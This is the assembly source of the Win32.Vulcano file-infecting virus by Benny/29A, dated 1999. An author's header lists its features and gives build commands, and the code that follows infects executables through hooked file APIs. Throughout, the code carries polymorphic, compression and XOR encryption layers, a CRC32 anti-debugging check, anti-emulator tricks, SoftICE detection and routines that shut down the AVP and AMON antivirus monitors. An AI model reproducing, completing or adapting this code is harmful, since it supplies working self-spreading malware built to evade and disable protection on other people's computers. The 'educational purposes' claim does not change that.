;                                                     ??????? ??????? ???????
;                                                     ??? ??? ??? ??? ??? ???
;          Win32.Vulcano	                      ??????  ??????? ???????
;          by Benny/29A                               ??????? ??????? ??? ???
;                                                     ??????? ??????? ??? ???
;
;
;
;Description
;????????????
;
;
;Hello everybody,
;
;I was wrong. Not BeGemot, but Vulcano is my best virus :D. It has lot of nice
;and never published features and it is ofcoz, very optimized. I hope u will
;like, coz this took me much time to code and even more time to test it. Here
;comes a little description of that. Heh, this is my best virus and it has very
;small description - I don't know how to better present it than just write
;a list of its features. Enjoy it!
;
;This virus is:
;		-	the first multiprocess Win32 (Win95/98/NT/2k compatible)
;			virus with interprocess communication(!!!)
;		-	per-process resident multithreaded fast mid-infector
;		-	polymorphic using two layers - advanced BPE32 and
;			second semi-morpher
;		-	compressed using BCE32
;		-	heavilly armoured
;		-	CRC32 protected
;		-	undetectable by any antivirus
;
;This virus uses:
;		-	Structured Exception Handling
;		-	EPO routines (virus patches one imported API)
;		-	CRC32 records instead of raw ANSI strings
;		-	Anti-* routines
;		-	Pentium and undocumented instructions (also in poly decryptor)
;
;This virus doesn't:
;		-	infect system files
;		-	infect files which doesn't contain .reloc section
;		-	infect small files
;		-	enlarge file
;		-	contain any payload
;
;This virus is able to:
;		-	deactivate some AV monitors
;		-	infect EXE/SCR/SFX/CPL/DAT/BAK files
;		-	overwrite relocations
;		-	communicate with other instances of virus
;
;And much more. In short words, this virus presents many new hot features never
;been published.
;
;
;
;Interprocess communication (IPC)
;?????????????????????????????????
;
;
;This is the best part of the virus :). The main idea is: make all actions
;in another process. Imagine, virus does nothing. Nothing in actual process.
;But if another infected program is running in system, virus will pass control
;to that instance of virus. This very difficult stuff is realised by file mapping
;mirrored in swap file, mutexes and threads. That code is very optimized, but
;unfortunetely, it contains some bugs, which fortunately aren't much visible.
;In 99,9999% of all cases u won't see anything suspicious. That's truth.
;
;
;
;What will happen on execution ?
;???????????????????????????????-
;
;
;Virus will (after patched API will be called):
;1)	Decrypt it's body by polymorphic decryptor
;2)     Decompress virus body
;3)     Decrypt virus body by 2nd decryptor
;4)     Check consistency of virus body by CRC32 - this prevents from setting
;	breakpoints
;5)     Check for Pentium processor
;6)     Find base of Kernel32.dll in memory
;7)     Find all needed APIs (using CRC32)
;8)	Create new thread which will hook some API functions
;9)	Wait for thread termination
;10)	Create/Open the space in swap file and initialize (create new) record
;	for IPC
;11)	Create new thread for IPC
;12)	Jump to host
;
;
;After hooked API call (API manipulating with files) will virus:
;1)     Get file name
;2)     Check file properties via IPC
;3)     Open file, check it and infect it via IPC
;4)	Call original API (depending on API)
;
;
;After hooked API call (ExitProcess, GetLastError, ...) will virus:
;1)	Check for application level debugger via IPC (if found, process will be
;	remotely terminated - veeery nice feature :))
;2)	Check for system level debugger (SoftICE) via IPC
;3)	Check for monitors in memory via IPC
;4)	Find random file
;5)	Check it via IPC
;6)	Check and infect it via IPC
;
;
;IPC thread in memory will:
;1)	Check for new request
;2)     Do property action
;3)     Pass execution to next thread
;
;
;
;Greetz
;???????
;
;
;       Darkman/29A.... Finally I finished it! Hope u like it...
;       Billy_Bel...... Where r u? Please mail me...
;	GriYo..........	U genius!
;       flush.......... no, neni to sice tak super jako to vase, ale da se to
;			snest, doufam :)
;	StarZer0.......	Who is Axelle? X-D
;
;
;
;How to build it
;????????????????
;
;
;	tasm32 -ml -m9 -q vulcano.asm
;	tlink32 -Tpe -c -x -aa -r  vulcano,,, import32
;	pewrsec vulcano.exe
;
;
;
;Last notes
;???????????
;
;Yeah, I'm really happy, coz I finished that. It was very hard to code it and
;much harder to debug it. I know it has some small bugs, but I hope u will like
;it over the all negative aspects as buggy code is. Please, tell me what do u
;think about it on IRC, or by mail. I can provide u binary form and if u want
;to have it, then there's nothing easier than contact me on benny@post.cz.
;The hardest thing to code was synchronization module. In first versions of
;Vulcano I used normal variable as semaphores, but the code was very slow and
;buggy. Then I recompiled it with mutexes and it worked much better. However,
;there is still code, which I can't and don't want to change.
;Last thing: this virus wasn't coded for spreading, but just and ONLY for
;education purposes only. It infects only huge files with relocation table
;and I hope it is kewl virus without all those spread-features.
;
;
;
;(c) 1999 Benny/29A. Enjoy!




.586p                                           ;why not ;)
.model flat                                     ;FLAT model

include mz.inc                                  ;include some important
include pe.inc                                  ;include-filez
include win32api.inc
include useful.inc


;some instructions
push_LARGE_0	equ		;PUSH LARGE 0
SALC		equ			;SALC opcode
RDTCS		equ		;RDTCS


;some equates for VLCB (VLCB = VuLcano Control Block)
VLCB_Signature	equ	00			;signature
VLCB_TSep	equ	08			;record separator
VLCB_THandle	equ	00			;mutex handle
VLCB_TID	equ	04			;ID of service
VLCB_TData	equ	08			;data
VLCB_TSize	equ	SIZEOF_WIN32_FIND_DATA+8;size of one record
VLCB_SetWait	equ	00			;set data and wait for result
VLCB_WaitGet	equ	01			;wait for signalisation and get data
VLCB_Quit	equ	01			;quit
VLCB_Check	equ	02			;check file
VLCB_Infect	equ	03			;infect file
VLCB_Debug1	equ	04			;check for app level debugger
VLCB_Debug2	equ	05			;check for SoftICE
VLCB_Monitor	equ	06			;check for AVP and AMON monitors


j_api	macro	API				;JMP DWORD PTR [XXXXXXXXh]
	dw	25ffh
API	dd	?
endm


c_api	macro	API				;CALL DWORD PTR [XXXXXXXXh]
	dw	15ffh
API	dd	?
endm


extrn GetModuleHandleA:PROC			;APIs needed in first
extrn ExitProcess:PROC				;generation only


.data                                           ;data section
VulcanoInit: 	                                ;Start of virus
	SALC					;undoc. opcode to fuck emulators
	push dword ptr [offset _GetModuleHandleA]	;push original API
ddAPI = dword ptr $-4
	push 400000h				;push image base
ImgBase = dword ptr $-4
	pushad					;store all registers
	call gd                                 ;get delta offset
gd:     pop ebp                                 ;...
        lea esi, [ebp + _compressed_ - gd]      ;where is compressed virus
                                                ;stored
        lea edi, [ebp + decompressed - gd]      ;where will be virus
                                                ;decompressed
        mov ecx, 0				;size of compressed virus
c_size = dword ptr $-4                        


;Decompression routine from BCE32 starts here.
	pushad					;save all regs
	xor eax, eax				;EAX = 0
	xor ebp, ebp				;EBP = 0
	cdq					;EDX = 0
	lodsb					;load decryption key
	push eax				;store it
	lodsb					;load first byte
	push 8					;store 8
	push edx				;store 0
d_bits:	push ecx				;store ECX
	test al, 80h				;test for 1
	jne db0
	test al, 0c0h				;test for 00
	je db1
	test al, 0a0h				;test for 010
	je db2
	mov cl, 6				;its 011
	jmp tb2
testb:	test bl, 1				;is it 1 ?
	jne p1
	push 0					;no, store 0
_tb_:	mov eax, ebp				;load byte to EAX
	or al, [esp]				;set bit
	ror al, 1				;and make space for next one
	call cbit
	ret
p1:	push 1					;store 1
	jmp _tb_				;and continue
db0:	xor cl, cl				;CL = 0
	mov byte ptr [esp+4], 1			;store 1
testbits:
	push eax				;store it
	push ebx				;...
	mov ebx, [esp+20]			;load parameter
	ror bl, cl				;shift to next bit group
	call testb				;test bit
	ror bl, 1				;next bit
	call testb				;test it
	pop ebx					;restore regs
	pop eax
	mov ecx, [esp+4]			;load parameter
bcopy:	cmp byte ptr [esp+8], 8			;8. bit ?
	jne dnlb				;nope, continue
	mov ebx, eax				;load next byte
	lodsb
	xchg eax, ebx
	mov byte ptr [esp+8], 0			;and nulify parameter
	dec dword ptr [esp]			;decrement parameter
dnlb:	shl al, 1				;next bit
	test bl, 80h				;is it 1 ?
	je nb					;no, continue
	or al, 1				;yeah, set bit
nb:	rol bl, 1				;next bit
	inc byte ptr [esp+8]			;increment parameter
	loop bcopy				;and align next bits
	pop ecx					;restore ECX
	inc ecx					;test flags
	dec ecx					;...
	jns d_bits				;if not sign, jump
	pop eax					;delete pushed parameters
	pop eax					;...
	pop eax					;...
	popad					;restore all regs
	jmp decompressed
cbit:	inc edx					;increment counter
	cmp dl, 8				;byte full ?
	jne n_byte				;no, continue
	stosb					;yeah, store byte
	xor eax, eax				;and prepare next one
	cdq					;...
n_byte:	mov ebp, eax				;save back byte
	ret Pshd		;quit from procedure with one parameter on stack
db1:	mov cl, 2				;2. bit in decryption key
	mov byte ptr [esp+4], 2			;2 bit wide
	jmp testbits				;test bits
db2:	mov cl, 4				;4. bit
tb2:	mov byte ptr [esp+4], 3			;3 bit wide
	jmp testbits				;test bits

_compressed_    db      virus_end-compressed+200h dup (?) ;here is stored compressed
                                                ;virus body
decompressed:   db      virus_end-compressed dup (?)  ;here decompressed
                db      size_unint dup (?)      ;and here all uninitialized
                                                ;variables
virtual_end:                                    ;end of virus in memory
ends

.code                                           ;start of code section
first_gen:                                      ;first generation code
	;second layer of encryption
	mov esi, offset encrypted		;encrypt from...
	mov ecx, (virus_end-encrypted+3)/4	;encrypt how many bytes...
encrypt1:
	lodsd					;get dword
	xor eax, 1				;encrypt
	mov [esi-4], eax			;and store it
	loop encrypt1				;

	mov esi, offset compressed              ;source
        mov edi, offset _compressed_            ;destination
        mov ecx, virus_end-compressed+2         ;size
        mov ebx, offset workspace1              ;workspace1
        mov edx, offset workspace2              ;workspace2
        call BCE32_Compress                     ;Compress virus body!
        dec eax
        mov [c_size], eax                       ;save compressed virus size

	push 0					;parameter for GetModuleHandleA
	call VulcanoInit			;call virus code

	push 0					;parameter for ExitProcess
	call ExitProcess			;this will be hooked by virus l8r

;Compression routine from BCE32 starts here. This is used only in first gen.

BCE32_Compress  Proc
	pushad					;save all regs
;stage 1
	pushad					;and again
create_table:
	push ecx				;save for l8r usage
	push 4
	pop ecx					;ECX = 4
	lodsb					;load byte to AL
l_table:push eax				;save it
	xor edx, edx				;EDX = 0
	and al, 3				;this stuff will separate and test
	je st_end				;bit groups
	cmp al, 2
	je st2
	cmp al, 3
	je st3
st1:	inc edx					;01
	jmp st_end
st2:	inc edx					;10
	inc edx
	jmp st_end
st3:	mov dl, 3				;11
st_end:	inc dword ptr [ebx+4*edx]		;increment count in table
	pop eax
	ror al, 2				;next bit group
	loop l_table
	pop ecx					;restore number of bytes
	loop create_table			;next byte

	push 4					;this will check for same numbers
	pop ecx					;ECX = 4
re_t:	cdq					;EDX = 0
t_loop:	mov eax, [ebx+4*edx]			;load DWORD
	inc dword ptr [ebx+4*edx]		;increment it
	cmp eax, [ebx]				;test for same numbers
	je _inc_				;...
	cmp eax, [ebx+4]			;...
	je _inc_				;...
	cmp eax, [ebx+8]			;...
	je _inc_				;...
	cmp eax, [ebx+12]			;...
	jne ninc_				;...
_inc_:	inc dword ptr [ebx+4*edx]		;same, increment it
	inc ecx					;increment counter (check it in next turn)
ninc_:	cmp dl, 3				;table overflow ?
	je re_t					;yeah, once again
	inc edx					;increment offset to table
	loop t_loop				;loop
	popad					;restore regs

;stage 2
	pushad					;save all regs
	mov esi, ebx				;get pointer to table
	push 3
	pop ebx					;EBX = 3
	mov ecx, ebx				;ECX = 3
rep_sort:					;bubble sort = the biggest value will
						;always "bubble up", so we know number
						;steps
	push ecx				;save it
	mov ecx, ebx				;set pointerz
	mov edi, edx				;...
	push edx				;save it
	lodsd					;load DWORD (count)
	mov edx, eax				;save it
sort:	lodsd					;load next
	cmp eax, edx				;is it bigger
	jb noswap				;no, store it
	xchg eax, edx				;yeah, swap DWORDs
noswap:	stosd					;store it
	loop sort				;next DWORD
	mov eax, edx				;biggest in EDX, swap it
	stosd					;and store
	lea esi, [edi-16]			;get back pointer
	pop edx					;restore regs
	pop ecx
	loop rep_sort				;and try next DWORD
	popad
;stage 3
	pushad					;save all regs
	xor eax, eax				;EAX = 0
	push eax				;save it
	push 4
	pop ecx					;ECX = 4
n_search:
	push edx				;save regs
	push ecx
	lea esi, [ebx+4*eax]			;get pointer to table
	push eax				;store reg
	lodsd					;load DWORD to EAX
	push 3
	pop ecx					;ECX = 3
	mov edi, ecx				;set pointerz
search:	mov esi, edx
	push eax				;save it
	lodsd					;load next
	mov ebp, eax
	pop eax
	cmp eax, ebp				;end ?
	je end_search
	dec edi					;next search
	add edx, 4
	loop search
end_search:
	pop eax					;and next step
	inc eax
	pop ecx
	pop edx
	add [esp], edi
	rol byte ptr [esp], 2
	loop n_search
	pop [esp.Pushad_ebx]			;restore all
	popad					;...
;stage 4
	xor ebp, ebp				;EBP = 0
	xor edx, edx				;EDX = 0
	mov [edi], bl				;store decryption key
	inc edi					;increment pointer
next_byte:
	xor eax, eax				;EAX = 0
	push ecx
	lodsb					;load next byte
	push 4
	pop ecx					;ECX = 4
next_bits:
	push ecx				;store regs
	push eax
	and al, 3				;separate bit group
	push ebx				;compare with next group
	and bl, 3
	cmp al, bl
	pop ebx
	je cb0
	push ebx				;compare with next group
	ror bl, 2
	and bl, 3
	cmp al, bl
	pop ebx
	je cb1
	push ebx				;compare with next group
	ror bl, 4
	and bl, 3
	cmp al, bl
	pop ebx
	je cb2
	push 0					;store bit 0
	call copy_bit
	push 1					;store bit 1
	call copy_bit
cb0:	push 1					;store bit 1
end_cb1:call copy_bit
	pop eax
	pop ecx
	ror al, 2
	loop next_bits				;next bit
	pop ecx
	loop next_byte				;next byte
	mov eax, edi				;save new size
	sub eax, [esp.Pushad_edi]		;...
	mov [esp.Pushad_eax], eax		;...
	popad					;restore all regs
	cmp eax, ecx				;test for negative compression
	jb c_ok					;positive compression
	stc					;clear flag
	ret					;and quit
c_ok:	clc					;negative compression, set flag
	ret					;and quit
cb1:	push 0					;store bit 0
end_cb2:call copy_bit
	push 0					;store bit 0
	jmp end_cb1
cb2:	push 0					;store bit 0
	call copy_bit
	push 1					;store bit 1
	jmp end_cb2
copy_bit:
	mov eax, ebp				;get byte from EBP
	shl al, 1				;make space for next bit
	or al, [esp+4]				;set bit
	jmp cbit
BCE32_Compress	EndP				;end of compression procedure


compressed:                                     ;compressed body starts here
        @SEH_SetupFrame 		;setup SEH frame
        call gdlta	                        ;calculate delta offset
gdelta:	dd	ddFindFirstFileA-gdelta		;addresses
	dd	ddFindNextFileA-gdelta		;of variables
	dd	ddFindClose-gdelta		;where will
	dd	ddSetFileAttributesA-gdelta	;be stored
	dd	ddSetFileTime-gdelta		;addresses of APIs
	dd	ddCreateFileA-gdelta
	dd	ddCreateFileMappingA-gdelta
	dd	ddMapViewOfFile-gdelta
	dd	ddUnmapViewOfFile-gdelta
	dd	ddCreateThread-gdelta
	dd	ddWaitForSingleObject-gdelta
	dd	ddCloseHandle-gdelta
	dd	ddCreateMutexA-gdelta
	dd	ddReleaseMutex-gdelta
	dd	ddOpenMutexA-gdelta
	dd	ddSleep-gdelta
	dd	ddVirtualProtect-gdelta
	dd	ddGetCurrentProcessId-gdelta
	dd	ddOpenProcess-gdelta
	dd	ddTerminateProcess-gdelta
	dd	ddLoadLibraryA-gdelta
	dd	ddGetProcAddress-gdelta
	dd	ddFreeLibrary-gdelta
	dd	?				;end of record

newHookers:
	dd	newFindFirstFileA-gdelta	;addresses of API hookers
	dd	newFindNextFileA-gdelta
	dd	newCopyFileA-gdelta
	dd	newCopyFileExA-gdelta
	dd	newCreateFileA-gdelta
	dd	newCreateProcessA-gdelta
	dd	newDeleteFileA-gdelta
	dd	newGetFileAttributesA-gdelta
	dd	newGetFullPathNameA-gdelta
	dd	new_lopen-gdelta
	dd	newMoveFileA-gdelta
	dd	newMoveFileExA-gdelta
	dd	newOpenFile-gdelta
	dd	newSetFileAttributesA-gdelta
	dd	newWinExec-gdelta
	dd	newExitProcess-gdelta
	dd	newExitThread-gdelta
	dd	newGetLastError-gdelta
	dd	newCloseHandle-gdelta
	dd	?				;end of record

oldHookers:
	dd	oldFindFirstFileA-gdelta	;addresses, where will be
	dd	oldFindNextFileA-gdelta		;stored original
	dd	oldCopyFileA-gdelta		;API callers
	dd	oldCopyFileExA-gdelta
	dd	oldCreateFileA-gdelta
	dd	oldCreateProcessA-gdelta
	dd	oldDeleteFileA-gdelta
	dd	oldGetFileAttributesA-gdelta
	dd	oldGetFullPathNameA-gdelta
	dd	old_lopen-gdelta
	dd	oldMoveFileA-gdelta
	dd	oldMoveFileExA-gdelta
	dd	oldOpenFile-gdelta
	dd	oldSetFileAttributesA-gdelta
	dd	oldWinExec-gdelta
	dd	oldExitProcess-gdelta
	dd	oldExitThread-gdelta
	dd	oldGetLastError-gdelta
	dd	oldCloseHandle-gdelta

gdlta:	pop ebp					;get delta offset
	lea esi, [ebp + encrypted - gdelta]	;get start of encrypted code
	mov ecx, (virus_end-encrypted+3)/4	;number of dwords to encrypt
	push es					;save selector
	push ds
	pop es					;ES=DS
decrypt:lodsd					;load dword
	xor eax, 1				;decrypt it
	mov es:[esi-4], eax			;save dword with AntiAV (usage of
	loop decrypt				;selectors)

encrypted:					;encrypted code starts here
	pop es					;restore selector
	lea esi, [ebp + crc32prot - gdelta]	;start of CRC32 protected code
	mov edi, virus_end-crc32prot		;size of that
	call CRC32				;calculate CRC32
	cmp eax, 05BB5B647h			;check for consistency
crc32prot:
	jne jmp_host		;jump to host if breakpoints set and such

	;Pentium+ check
	pushad
        pushfd                                  ;save EFLAGS
        pop eax                                 ;get them
        mov ecx, eax                            ;save them
        or eax, 200000h                         ;flip ID bit in EFLAGS
        push eax                                ;store
        popfd                                   ;flags
        pushfd                                  ;get them back
        pop eax                                 ;...
        xor eax, ecx                            ;same?
        je end_cc                               ;shit, we r on 486-
        xor eax, eax                            ;EAX=0
        inc eax                                 ;EAX=1
        cpuid                                   ;CPUID
        and eax, 111100000000b                  ;mask processor family
        cmp ah, 4                               ;is it 486?
        je end_cc                               ;baaaaaaad
	popad

	mov eax, ds				;this will fuck
	push eax				;some old versions
	pop ds					;of NodICE
	mov ebx, ds
	xor eax, ebx
	jne jmp_host

	mov eax, 77F00000h			;WinNT 4.0 k32 image base
	call get_base
	jecxz k32_found				;we got image base
	mov eax, 77E00000h			;Win2k k32 image base
	call get_base
	jecxz k32_found				;we got image base
	mov eax, 77ED0000h			;Win2k k32 image base
	call get_base
	jecxz k32_found				;we got image base
	mov eax, 0BFF70000h			;Win95/98 k32 image base
	call get_base
	test ecx, ecx
	jne jmp_host				;base of k32 not found, quit

	push cs
	lea ebx, [ebp + k32_found - gdelta]	;continue on another label
	push ebx
	retf					;fuck u emulator! :)

end_cc:	popad					;restore all registers
	jmp jmp_host				;and jump to host

	db	'Win32.Vulcano by Benny/29A'	;little signature :)

k32_found:
	mov ebx, [esp.cPushad+8]		;get image base of app
	mov [ebp + GMHA - gdelta], ebx		;save it
	add ebx, [ebx.MZ_lfanew]		;get to PE header
	lea esi, [ebp + crcAPIs - gdelta]	;start of CRC32 API table
	mov edx, ebp				;get table of pointers
s_ET:	mov edi, [edx]				;get item
	test edi, edi				;is it 0?
	je end_ET				;yeah, work is done
	add edi, ebp				;normalize
	push eax				;save EAX
	call SearchET				;search for API
	stosd					;save its address
	test eax, eax				;was it 0?
	pop eax					;restore EAX
	je jmp_host				;yeah, error, quit
	add esi, 4				;correct pointers
	add edx, 4				;to pointers...
	jmp s_ET				;loop
get_base:
	pushad					;save all registers
	@SEH_SetupFrame 		;setup SEH frame
	xor ecx, ecx				;set error value
	inc ecx
	cmp word ptr [eax], IMAGE_DOS_SIGNATURE	;is it EXE?
	jne err_gbase				;no, quit
	dec ecx					;yeah, set flag
err_gbase:					;and quit
	@SEH_RemoveFrame			;remove SEH frame
	mov [esp.Pushad_ecx], ecx		;save flag
	popad					;restore all registers
	ret					;and quit from procedure

end_ET:	lea eax, [ebp + tmp - gdelta]		;now we will create new
	push eax				;thread to hide writing to
	xor eax, eax				;Import table
	push eax
	push ebp				;delta offset
	lea edx, [ebp + NewThread - gdelta]	;address of thread procedure
	push edx
	push eax				;and other shit to stack
	push eax
	mov eax, 0
ddCreateThread = dword ptr $-4
	call eax				;create thread!
	test eax, eax				;is EAX=0?
	je jmp_host				;yeah, quit

	push eax				;parameter for CloseHandle
	push -1					;infinite loop
	push eax				;handle of thread
	call [ebp + ddWaitForSingleObject - gdelta]	;wait for thread termination

	call [ebp + ddCloseHandle - gdelta]	;close thread handle

;now we will create space in shared memory for VLCB structure
	call @VLCB
	db	'VLCB',0			;name of shared area
@VLCB:	push 2000h				;size of area
	push 0
	push PAGE_READWRITE
	push 0
	push -1					;SWAP FILE!
	call [ebp + ddCreateFileMappingA - gdelta]	;open area
	test eax, eax
	je jmp_host				;quit if error

	xor edx, edx
	push edx
	push edx
	push edx
	push FILE_MAP_WRITE
	push eax
	call [ebp + ddMapViewOfFile - gdelta]	;map view of file to address
	xchg eax, edi				;space of virus
	test edi, edi
	je end_gd1				;quit if error
	mov [ebp + vlcbBase - gdelta], edi	;save base address

	;now we will create named mutex
	call @@@1				;push address of name
@@1:	dd	0				;random name
@@@1:	RDTCS					;get random number
	mov edx, [esp]				;get address of name
	shr eax, 8				;terminate string with \0
	mov [edx], eax				;and save it
	mov esi, [esp]				;get address of generated name
	push 0
	push 0
	mov eax, 0
ddCreateMutexA = dword ptr $-4
	call eax				;create mutex
	test eax, eax
	je end_gd2				;quit if error

;now we will initialize VLCB structure
	xor edx, edx				;EDX=0
	mov eax, edi				;get base of VLCB
       	mov [eax.VLCB_Signature], 'BCLV'	;save signature

;now we will initialize record for thread
	mov ecx, 20				;20 communication channels
sr_t:	cmp dword ptr [edi.VLCB_TSep.VLCB_THandle], 0	;check handle
	jne tnext				;if already reserved, then try next
	mov esi, [esi]				;get name of mutex
	mov [edi.VLCB_TSep.VLCB_THandle], esi	;save it
	mov [ebp + t_number - gdelta], edx	;and save ID number of mutex

	lea eax, [ebp + tmp - gdelta]		;create new thread
	push eax				;for IPC
	xor eax, eax
	push eax
	push ebp
	lea edx, [ebp + mThread - gdelta]	;address of thread procedure
	push edx
	push eax
	push eax
	call [ebp + ddCreateThread - gdelta]	;create new thread
	xchg eax, ecx
	jecxz end_gd3				;quit if error

jmp_host:
	@SEH_RemoveFrame                        ;remove SEH frame
	mov eax, [esp.cPushad+4]		;save address of previous
	mov [esp.Pushad_eax], eax		;API caller
        popad                                   ;restore all regs
	add esp, 8				;repair stack pointer
	push cs					;save selector
	push eax				;save offset of API caller
	retf					;jump to host :)
tnext:	add edi, VLCB_TSize			;get to next record
	inc edx					;increment counter
	loop sr_t				;try again
	jmp jmp_host				;quit if more than 20 viruses r in memory
end_gd3:push esi
	call [ebp + ddCloseHandle - gdelta]	;close mutex
end_gd2:push dword ptr [ebp + vlcbBase - gdelta]
	call [ebp + ddUnmapViewOfFile - gdelta]	;unmap VLCB
end_gd1:push edi
	call [ebp + ddCloseHandle - gdelta]	;close mapping of file
	jmp jmp_host				;and jump to host


gtDelta:call mgdlta				;procedure used to getting
mgdelta:db	0b8h				;fuck u disassemblers
mgdlta:	pop ebp					;get it
	ret					;and quit


newFindFirstFileA:				;hooker for FindFirstFileA API
	push dword ptr [esp+8]			;push parameters
	push dword ptr [esp+8]			;...
	c_api oldFindFirstFileA			;call original API

p_file:	pushad					;store all registers
	call gtDelta				;get delta
	mov ebx, [esp.cPushad+8]		;get Win32 Find Data
	call Check&Infect			;try to infect file
	popad					;restore all registers
	ret 8					;and quit

newFindNextFileA:
	push dword ptr [esp+8]			;push parameters
	push dword ptr [esp+8]			;...
	c_api oldFindNextFileA			;call previous API
	jmp p_file				;and continue


process_file:
	pushad					;store all registers
	call gtDelta				;get delta offset
	lea esi, [ebp + WFD2 - mgdelta]		;get Win32_Find_Data
	push esi				;save it
	push dword ptr [esp.cPushad+0ch]	;push offset to filename
	call [ebp + ddFindFirstFileA - mgdelta]	;find that file
	inc eax
	je end_pf				;quit if error
	dec eax
	xchg eax, ecx				;handle to ECX
	mov ebx, esi				;WFD to EBX
	call Check&Infect			;check and infect it
	push ecx
	call [ebp + ddFindClose - mgdelta]	;close find handle
end_pf:	popad					;restore all registers
	ret					;and quit

;generic hookers for some APIs
newCopyFileExA:
	call process_file
	j_api oldCopyFileExA
newCopyFileA:
	call process_file
	j_api oldCopyFileA
newCreateFileA:
	call process_file
	j_api oldCreateFileA
newCreateProcessA:
	call process_file
	j_api oldCreateProcessA
newDeleteFileA:
	call process_file
	j_api oldDeleteFileA
newGetFileAttributesA:
	call process_file
	j_api oldGetFileAttributesA
newGetFullPathNameA:
	call process_file
	j_api oldGetFullPathNameA
new_lopen:
	call process_file
	j_api old_lopen
newMoveFileA:
	call process_file
	j_api oldMoveFileA
newMoveFileExA:
	call process_file
	j_api oldMoveFileExA
newOpenFile:
	call process_file
	j_api oldOpenFile
newSetFileAttributesA:
	call process_file
	j_api oldSetFileAttributesA
newWinExec:
	call process_file
	j_api oldWinExec

open_driver:
        xor eax, eax                            ;EAX=0
        push eax                                ;parameters
        push 4000000h                           ;for
        push eax                                ;CreateFileA
        push eax                                ;API
        push eax                                ;function
        push eax                                ;...
	push ebx
        call [ebp + ddCreateFileA - mgdelta]    ;open driver
	ret
close_driver:
        push eax                                ;close its handle
        call [ebp + ddCloseHandle - mgdelta]
	ret

common_stage:					;infect files in curr. directory
	pushad
	call gtDelta				;get delta offset

	mov ecx, fs:[20h]			;get context debug
	jecxz n_debug				;if zero, debug is not present

k_debug:mov eax, 0
ddGetCurrentProcessId = dword ptr $-4
	call eax				;get ID number of current process
	call vlcb_stuph				;common stuph
	lea esi, [ebp + data_buffer - mgdelta]
	mov dword ptr [esi.WFD_szAlternateFileName], ebp	;set random data
	mov ebx, VLCB_Debug1			;kill debugger
	call get_set_VLCB			;IPC!

vlcb_stuph:
	xor edx, edx				;random thread
	dec edx
	mov ecx, VLCB_SetWait			;set and wait for result
	ret

n_debug:call vlcb_stuph				;common stuph
	lea esi, [ebp + data_buffer - mgdelta]
	mov dword ptr [esi.WFD_szAlternateFileName], ebp	;set random data
	mov ebx, VLCB_Debug2			;check for SoftICE
	call get_set_VLCB			;IPC!
	mov eax, dword ptr [esi.WFD_szAlternateFileName]	;get result
	dec eax
	test eax, eax
	je endEP				;quit if SoftICE in memory

	call vlcb_stuph				;common stuph
	lea esi, [ebp + data_buffer - mgdelta]
	mov dword ptr [esi.WFD_szAlternateFileName], ebp	;set random data
	mov ebx, VLCB_Monitor			;kill monitors
	call get_set_VLCB			;IPC!

	lea ebx, [ebp + WFD - mgdelta]		;get Win32 Find Data
	push ebx				;store its address
	call star
	db	'*.*',0				;create mask
star:	mov eax, 0
ddFindFirstFileA = dword ptr $-4
	call eax				;find file
	inc eax
	je endEP				;if error, then quit
	dec eax
	mov [ebp + fHandle - mgdelta], eax	;store handle
	call Check&Infect			;and try to infect file

findF:	lea ebx, [ebp + WFD - mgdelta]		;get Win32 Find Data
	push ebx				;store address
	push_LARGE_0				;store handle
fHandle = dword ptr $-4
	mov eax, 0
ddFindNextFileA = dword ptr $-4
	call eax				;find next file
	xchg eax, ecx				;result to ECX
	jecxz endEP2				;no more files, quit
	call Check&Infect			;try to infect file
	jmp findF				;find another file

endEP2:	push dword ptr [ebp + fHandle - mgdelta];store handle
	mov eax, 0
ddFindClose = dword ptr $-4
	call eax				;close it
endEP:	popad
	ret


newExitProcess:					;hooker for ExitProcess API
	pushad
	call common_stage			;infect files in current directory
	call gtDelta				;get delta offset
	mov edx, [ebp + t_number - mgdelta]	;get ID number of thread
	push edx
	mov ecx, VLCB_SetWait			;set and wait for result
	lea esi, [ebp + data_buffer - mgdelta]
	mov dword ptr [esi.WFD_szAlternateFileName], ebp
	mov ebx, VLCB_Quit			;terminate thread
	call get_set_VLCB			;IPC!

	pop edx					;number of thread
	imul edx, VLCB_TSize			;now we will
	push VLCB_TSize/4			;erase thread
	pop ecx					;record
	add edi, edx				;from VLCB
	add edi, VLCB_TSep
	xor eax, eax
	rep stosd				;...
	popad
	j_api oldExitProcess			;jump to original API


;next hookers
newExitThread:
	call common_stage
	j_api oldExitThread
newCloseHandle:
	call common_stage
	j_api oldCloseHandle
newGetLastError:
	call common_stage
	j_api oldGetLastError


Monitor:pushad					;store all registers
	call szU32				;push address of string USER32.dll
	db	'USER32',0
szU32:	mov eax, 0
ddLoadLibraryA = dword ptr $-4			;Load USER32.dll
	call eax
	xchg eax, ebx
	test ebx, ebx
	je end_mon2				;quit if error
	call FindWindowA			;push address of string FindWindowA
	db	'FindWindowA',0
FindWindowA:
	push ebx				;push lib handle
	mov eax, 0
ddGetProcAddress = dword ptr $-4		;get address of FindWindowA API
	call eax
	xchg eax, esi
	test esi, esi
	je end_mon				;quit if error
	call PostMessageA			;push address of string PostMessageA
	db	'PostMessageA',0
PostMessageA:
	push ebx
	call [ebp + ddGetProcAddress - mgdelta]	;get address of PostMessageA
	xchg eax, edi
	test edi, edi
	je end_mon				;quit if error

	mov ecx, 3				;number of monitors
	call Monitors				;push address of strings
	db	'AVP Monitor',0			;AVP monitor
	db	'Amon Antivirus Monitor',0	;AMON english version
	db	'Antiv?rusov? monitor Amon',0	;AMON slovak version
Monitors:
	pop edx					;pop address
k_mon:	pushad					;store all registers
	xor ebp, ebp
	push edx
	push ebp
	call esi				;find window
	test eax, eax
	je next_mon				;quit if not found
	push ebp
	push ebp
	push 12h				;WM_QUIT
	push eax
	call edi				;destroy window
next_mon:
	popad					;restore all registers
	push esi
	mov esi, edx
	@endsz					;get to next string
	mov edx, esi				;move it to EDX
	pop esi
	loop k_mon				;try another monitor

end_mon:push ebx				;push lib handle
	mov eax, 0
ddFreeLibrary = dword ptr $-4
	call eax				;unload library
end_mon2:
	popad					;restore all registers
	jmp d_wr				;and quit


Debug2:	lea ebx, [ebp + sice95 - mgdelta]	;address of softice driver string
	call open_driver			;open driver
        inc eax                                 ;is EAX==0?
        je n_sice		                ;yeah, SoftICE is not present
        dec eax
	call close_driver			;close driver
	jmp d_wr				;and quit
n_sice:	lea ebx, [ebp + siceNT - mgdelta]	;address of softice driver string
	call open_driver			;open driver
	inc eax
	je n2_db				;quit if not present
	dec eax
	call close_driver			;close driver
	jmp d_wr				;and quit


Debug1:	push dword ptr [esi.WFD_szAlternateFileName]	;push ID number of process
	push 0
	push 1
	mov eax, 0
ddOpenProcess = dword ptr $-4
	call eax				;open process
